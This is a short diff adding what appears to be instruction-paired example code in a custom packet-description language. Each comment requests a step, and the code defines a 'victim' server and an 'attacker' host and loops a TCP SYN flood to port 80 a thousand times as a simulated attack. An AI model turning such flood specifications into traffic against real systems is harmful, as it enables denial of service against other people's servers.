@@ -1,0 +1,17 @@
+// INSTRUCTION: Define a target server with IP 192.168.1.100 and a dummy MAC.
+HOST victim_server { IP 192.168.1.100 MAC 00:11:22:33:44:55 }
+
+// INSTRUCTION: Define a malicious attacker with IP 10.0.0.50.
+HOST attacker { IP 10.0.0.50 }
+
+// INSTRUCTION: Define a flow that sends a TCP SYN packet from the attacker to the target server on port 80, with a fast wait time.
+FLOW syn_flood(src, dst) {
+    src -> dst TCP SYN DSTPORT 80 WAIT 1ms
+}
+
+// INSTRUCTION: Compile block to loop the syn_flood flow 1000 times, simulating an attack.
+COMPILE {
+    LOOP 1000 {
+        syn_flood(attacker, victim_server)
+    }
+}
